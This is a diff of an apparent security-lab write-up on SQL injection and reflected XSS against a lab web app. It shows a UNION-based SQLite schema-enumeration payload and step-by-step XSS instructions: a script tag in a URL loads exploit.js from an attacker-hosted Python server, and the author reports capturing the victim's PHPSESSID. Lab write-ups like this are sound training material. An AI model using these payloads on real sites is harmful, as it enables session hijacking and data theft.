@@ -119,6 +119,7 @@ Once the malicious script runs in the victim’s browser, it can:
 
 - so lets try to know what is the used database scheme:
     > ' UNION SELECT name FROM sqlite_master WHERE type='table' --
+- In SQLite, sqlite_master is a special built-in table that stores information about all the schema objects in the database
 - on excuting this I got the following results: 
     - ![alt text](image-2.png)
 - it shows that we have 2 tables which are:    
@@ -176,8 +177,14 @@ vulnerable search field can be given through a URL parameter, it is possible to 
 URL of the form http://10.30.0.90/webpage?q=malicous-code , which leads
 to the reflected XSS vulnerability being exploited as soon as the user clicks a link.
 
-* so on excuting this command: 
-    > http://web-lab/search.php?q=<script src="http://10.30.0.1:9000/exploit.js"\></script\>
+* do the following steps in order: 
+    1. login with a user
+    2. go to **search.php** page
+    3. on the attacker machine craft the exploit.js 
+    4. on the attacker machine excute this command to open a server (in the same folder where exploit.js exists): 
+        >   python3 -m http.server 9000 --bind 10.30.0.1
+    5. in the url of the victim add this command
+        > http://web-lab/search.php?q=<script src="http://10.30.0.1:9000/exploit.js"\></script\>
 - we can see that I got the PHPSESSID as shown in the screenshot: 
     - ![alt text](image-9.png)
 - notice that if we were not logged in, the cookie parameter will be empty.
